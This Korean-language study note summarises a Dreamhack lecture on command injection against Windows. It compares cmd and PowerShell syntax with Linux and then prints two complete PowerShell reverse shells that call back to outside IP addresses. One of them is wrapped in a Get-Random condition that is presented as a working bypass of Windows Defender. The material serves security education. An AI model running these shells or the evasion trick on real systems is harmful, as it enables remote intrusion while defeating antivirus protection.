# Command Injection for Windows

<br/>

## Windows: 공격 사전 지식
### 윈도우 메타 문자
* 윈도우에서 명령어를 실행하기 위해 **cmd.exe** 또는 **파워셸**(Powershell)을 사용할 수 있음
    - 같은 운영체제 상에서 구동되지만 각 인터프리터에서 제공하는 문자와 기능은 서로 다름
* 윈도우와 리눅스의 메타 문자 비교
    | Linux | Windows (cmd, powershell) | 설명 |
    |---|---|---|
    | ```-A```, ```--A``` | ```/c``` | 커맨드 라인 옵션 |
    | ```$PATH``` | ```%PATH``` | 환경 변수 |
    | ```$ABCD``` | ```$ABCD``` (powershell only) | 쉘 변수 |
    | ```;``` | ```&```(cmd only), ```;```(powershell only) | 명령어 구분자 |
    | ```echo $(id)``` | ```for /f "delims=" %a in ('whoami') do echo %a``` | 명령어 치환 |
    | ```> /dev/null``` | ```> NUL```(cmd only), ```\| Out-Null```(powershell only) | 출력 제거 |
    | ```command \|\| true``` | ```command & rem```(cmd only), <br/>```command -ErrorAction SilentlyContinue```(poershell Cmdlet only) | ```command``` 명령어 오류 무시 |

<br/>

### 윈도우 명령어
* 윈도우와 리눅스의 명령어 비교
    | Linux | Windows | 설명 |
    |---|---|------|
    | ls | dir | 디렉토리(폴더) 파일 목록 출력 |
    | cat | type | 파일 내용 출력 |
    | cd | cd | 디렉토리(폴더) 이동 |
    | rm | del | 파일 삭제 |
    | mv | move | 파일 이동 |
    | cp | copy | 파일 복사 |
    | ifconfig | ipconfig | 네트워크 설정 |
    | env, export | set | 환경변수 설정 |
    - 자세한 윈도우 명령어는 [Windows Command 추가 자료](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Supplement/Windows%20Command.md)를 참고

<br/><br/>

## 윈도우 리버스 셸
* 윈도우도 리눅스와 같이 리버스 셸 공격이 가능하지만, 다음과 같은 차이점이 존재함
    | Linux | Window |
    |---|---|
    | 기본적으로 명령어와 스크립트를 실행하는데 있어 어떠한 제약도 존재하지 않음 | 윈도우 디펜더(Windows Defender)가 악성 스크립트를 감지하고 이를 실행하지 않음 *→ 우회 필요* |
* 리버스 셸 스크립트 예시
    ```powershell
    # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
    
    $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    ```
    - 악성 데이터가 있어 백신에 의해 차단되었다는 메시지("This script contains malicious content and has been blocked by your antivirus software")와 함께 실행에 실패함


<br/><br/>

## 윈도우 디펜더 우회
* 윈도우 디펜더는 악성 코드가 운영 체제에서 실행되는 것을 방지함 → 리버스 셸을 통한 공격을 수행하기 위해서는 **윈도우 디펜더 우회는 필수**임
* 리버스 셸 스크립트를 실행하는 우회 코드
    ```powershell
    $client = New-Object System.Net.Sockets.TCPClient("123.123.124.124",1234);
    $x = Get-Random; # Get-Random 함수를 이용하여 무작위 값을 생성함
    if ($x -ge 1) { # 랜덤으로 생성한 값이 1보다 큰 값인지 확인한 후에 리버스 셸 코드를 실행함
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{0};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
        };
        $client.Close();
    } else {
        $client.Close();
    }
    ```
    - ```Get-Random``` 함수를 이용하여 생성한 무작위 값이 1보다 큰 값인지 확인한 후에 리버스 셸 코드를 실행함 → 윈도우 디펜더는 이 조건문이 함수 실행 결과에 영향을 받는 것으로 판단하여 스크립트 실행을 허용함
    - 실행 결과
        + 우회 스크립트가 성공적으로 동작하면 리버스 셸이 동작하고 서버에 시스템 명령어를 실행시키고 그 결과를 확인할 수 있음

<br/><br/><br/><br/>
### 🔖 출처
* [드림핵 Web Hacking Advanced - Server Side] 📌 [ExploitTech: Command Injection for Windows](https://dreamhack.io/lecture/courses/301)
